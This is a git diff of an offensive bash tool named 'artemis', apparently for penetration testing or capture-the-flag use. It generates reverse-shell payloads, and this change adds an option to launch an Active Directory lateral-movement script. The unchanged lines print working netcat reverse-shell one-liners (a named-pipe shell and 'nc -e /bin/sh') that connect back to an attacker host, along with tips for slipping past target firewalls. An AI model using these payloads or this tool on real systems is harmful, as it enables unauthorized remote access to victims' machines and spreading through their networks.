@@ -7,12 +7,13 @@ Help()
 {
         echo -e "$line\nArtemis will run in interactive mode unless all arguments are supplied\nThese payloads are not intended to bypass Antivirus\n\n"
 	echo -e "This script supports the following arguments:\n\n-h: Display this help message\n\n"
+	echo -e "-a: Generate commands for Pivoting in Active Directory, instead of Reverse shell payloads. If used, all other arguments will be ignored\n\n"
 	echo -e "-i <IP_Address>: The IP Address to listen on\n\n-p <port>: The port to listen on (common port numbers are more likely to bypass your target's firewall!)\n\n"
 	echo -e "-l: Start a listener using specified interface and port (Don't use this option if you are starting a listener manually)\n\n"
 	echo -e "-t <Target_OS>: Specify the target OS for Web shell payloads & for stabilization tips [win/nix]\n\n"
 	echo -e "-s <Payload_Type>: Specify the type of Reverse shell to generate (Refer to the Payloads section for a list of accepted arguments)\n$line"
-	echo -e "\nExample Syntax: artemis -i 10.10.144.68 -p 443 -s ps -t nix -l\n$line"	
-        echo -e "Payloads:\n\n[ps] Powershell\n[bash]\n[nc] Netcat for *nix targets\n[java]\n[py] Python\n[php]\n\n"
+	echo -e "[Example Syntax]\n\nReverse Shell: artemis -i 10.10.144.68 -p 443 -s ps -t nix -l\n\nAD Pivoting: artemis -a\n$line"	
+	echo -e "Payloads:\n\n[ps] Powershell\n[bash]\n[nc] Netcat (*nix targets)\n[java]\n[py] Python (*nix targets)\n[php] (*nix targets)\n\n"
 	echo -e "[!] Tip: If you're having trouble catching a shell, try the following steps-\n\n1) Double check your firewall settings & verify target's IP Address\n"
 	echo -e "2) Instead of getting a Reverse Shell, start capturing ICMP packets and use a payload to make the target ping you a few times\n"
 	echo -e "3) Use common ports for your Reverse shell (e.g. 80 or 443) or try ports that hosts in your target's LAN are using\n"
@@ -35,7 +36,7 @@ then
 
 else
 #The : after an option means it requires an argument. A : in front of options lets you handle errors
-	while getopts ":hi:p:ls:t:" option; do
+	while getopts ":hi:p:ls:t:a" option; do
 		case $option in
 			h)
 				Help
@@ -54,6 +55,9 @@ else
 
 			t)
 				target=$OPTARG;;
+
+			a)
+				ad=0;;
 			
 			\?)
 				echo -e "\nError: Invalid argument"
@@ -63,6 +67,25 @@ else
 
 fi
 
+if [ -z "$ad" ] && [ $# -eq 0 ] 
+then
+	echo -e "\nSelect an operation:\n[1] Generate Reverse shell payload\n[2] Perform Active Directory pivoting\n"
+	read pivot
+
+	if [ "$pivot" == 2 ]
+	then
+		ad=0
+	else
+		ad=1
+	fi
+
+fi
+
+if [ "$ad" == 0 ]
+then
+	source $(readlink $(which artemis) | awk -F 'artemis.sh' '{print $1}')ad_LateralMove.sh
+	exit
+fi
 
 if [ -z "$host" ]
 then
@@ -130,7 +153,7 @@ then
 
 elif [ $mode == 3 ]
 then
-	echo -e "\nOutputting Netcat payloads for $host:$port\n\n[!] Tip: Named Pipe Payload is preferred and Alternate Payload only works for certain versions of Netcat\n\n"
+	echo -e "\nOutputting Netcat payloads for a Linux target using $host:$port\n\n[!] Tip: Named Pipe Payload is preferred and Alternate Payload only works for certain versions of Netcat\n\n"
 	echo -e "Named Pipe Payload:\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $host $port >/tmp/f\n\n"
 	echo -e "Alternate Payload:\nnc -e /bin/sh $host $port"
 
@@ -236,7 +259,7 @@ then
 #	echo -e "B) Disable Attacker's Echo:\nstty raw -echo\n\nC) Get Size of Terminal Window:\nstty size\n(Changes if you resize Terminal!)\n\n"
 #	echo -e "D) Foreground Reverse Shell:\nfg\n(Press \"Enter\" a couple times)\n\n"
 #	echo -e "E) Set Reverse Shell Terminal Size:\nstty rows X columns Y\n(Replace X & Y with the numbers from Step C)\n\n"
-	echo -e "[!] Tip: You may be able to create a SSH Keys on the target machine and use them for an upgraded shell\n$line" 
+	echo -e "[!] Tip: You may be able to create SSH Keys on the target machine and use them for an upgraded shell\n$line" 
 
 elif [ "$target" == "win" ]
 then
